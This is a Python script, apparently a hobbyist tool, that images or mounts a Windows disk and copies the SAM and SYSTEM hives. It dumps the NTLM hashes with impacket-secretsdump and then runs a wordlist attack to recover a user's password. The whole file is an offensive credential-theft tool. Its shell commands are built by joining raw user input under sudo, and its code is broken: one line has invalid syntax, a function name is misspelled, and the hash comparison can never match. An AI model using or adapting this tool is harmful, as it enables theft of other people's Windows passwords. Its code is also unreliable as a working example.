import hashlib, binascii, os, subprocess

def clone():
    os.chdir("/mnt/")

    print("..............................................")
    subprocess.call("sudo fdisk -l", shell=True)
    print("..............................................")

    inputfile = input("Enter Path to your Disk: ")
    outputfile = input("(include .img ) Enter Name of New Image file: ")
    blocksize = input("(Example: 3M) Enter Desired Block Size: ")
 
    subprocess.call("sudo dd if=" + inputfile + " of=" + outputfile + " bs=" + blocksize + " conv=noerror status=progress", shell=True)

def mkdir():
    os.chdir("/mnt/")
    print("[+] Directory Changed To /mnt/")
    os.mkdir(input("Enter New Name For A Directory: "))
    print("[+] Created Directory")

def animal():
    guesses = 1
    cracked = False

    def converted_ntlm(password):
        ntlm_hash = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest())

        return ntlm_hash

    def match_hashes(input, test):
        if input == test:
            return True

        else:
            return False


    os.chdir("/mnt/")
    directory = input("Confirm Name of Your Directory: ")
    print("..............................................") 
    subprocess.call("sudo fdisk -l", shell=True)
    print("..............................................")
    windows_harddrive = input("Enter Path To Windows Disk or Disk Image: ") 
    subprocess.call("sudo mount -o ro " + windows_harddrive + " " + directory, shell=True)
    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SAM .", shell=True)
    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM .", shell=True)
    subprocess.call("sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL > targethashes.txt", shell=True)
    subprocess.call("sudo rm -rf SYSTEM SAM", shell=True)
    subprocess.call("sudo nano targethashes.txt", shell=True)

    with open("targethashes.txt"), "r" as input_file:
        input_hash = input_file.readline()

        with open(input("Enter Path to Your Password List: "), "r", errors="ignore") as password_list:
        
            for line in password_list:
                if cracked:
                    break

                else:
                    password_guess = line.rstrip()
                    ntlm_hash = coverted_ntlm(password_guess)

                    print(f"GUESSES: {guesses}", end="\r")

                    if match_hashes(input_hash, ntlm_hash):
                        cracked = True

                    guesses += 1

            if cracked:
                print(f"PASSWORD FOUND: {password_guess}")
                subprocess.call("sudo rm -f targethashes.txt", shell=True)
            
            else:
                print(f"NO PASSWORD FOUND OUT OF {guesses} GUESSES")
                subprocess.call("sudo rm -f targethashes.txt", shell=True)
                subprocess.call("sudo umount " + windows_harddrive, shell=True) 

def main():
    try:
        print("..............................................")
        print("                     MENU                     ")
        print("..............................................")
        print("EDIT IN NANO WHAT HASH YOU WANT TO RUN THE ATTACK WHEN PROMPT SHOWS HASHES") 
        print("DELETE THE OTHER USER HASHES, SAVE AND THEN EXIT NANO")
        print("YOU NEED A EMPTY DIRECTORY IN /mnt/ TO CONTINUE")
        print("")
        choice = input("(Y) Make New Directory (C) Create Disk Image (N) Continue: ")
        if choice == "Y":
            mkdir()
            main()
        elif choice == "N":
            animal()
        elif choice == "C":
            clone()
            main()
        else:
            print("")
            print("INVALID INPUT EXITING")
            quit()

    except KeyboardInterrupt:
        print("")
        print("KEYBOARD INTERRUPTION EXITING")
        quit()
main()
